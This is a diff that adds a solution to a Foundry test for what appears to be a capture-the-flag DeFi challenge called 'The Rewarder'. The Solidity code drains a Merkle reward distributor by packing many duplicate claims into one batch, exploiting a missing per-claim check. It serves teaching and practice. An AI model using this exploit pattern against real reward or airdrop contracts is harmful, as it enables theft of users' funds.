@@ -148,7 +148,53 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Check {dvt,weth}-distribution.json for player (0x44E97aF4418b7a17AABD8090bEA0A471a366305C).
+        uint256 toks_for_me = 11524763827831882;
+        uint256 weth_for_me = 1171088749244340;
+
+        bytes32[] memory tok_rewards_json = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory weth_rewards_json = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // TheRewarderDistributor has a big issue - allows us to do many claims in one transaction but only
+        // checks once instead of checking inside the loop after each claim.
+        // Calculate the correct number of transactions to drain everything based on my allocation and the total supply.
+        uint256 toks_txes = TOTAL_DVT_DISTRIBUTION_AMOUNT / toks_for_me;
+        uint256 weth_txes = TOTAL_WETH_DISTRIBUTION_AMOUNT / weth_for_me;
+        uint256 totalTxCount = toks_txes + weth_txes;
+
+        IERC20[] memory toks = new IERC20[](2);
+        toks[0] = IERC20(address(dvt));
+        toks[1] = IERC20(address(weth));
+
+        Claim[] memory claims = new Claim[](totalTxCount);
+        uint256 i = 0;
+        bytes32[] memory proof_tok = merkle.getProof(tok_rewards_json, 188);
+        bytes32[] memory proof_w = merkle.getProof(weth_rewards_json, 188);
+        while(i < toks_txes)
+        {
+            claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: toks_for_me,
+                    tokenIndex: 0,
+                    proof: proof_tok
+                });
+            ++ i;
+        }
+        while(i < totalTxCount)
+        {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: weth_for_me,
+                tokenIndex: 1,
+                proof: proof_w
+            });
+            ++ i;
+        }
+
+        distributor.claimRewards(claims, toks);
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
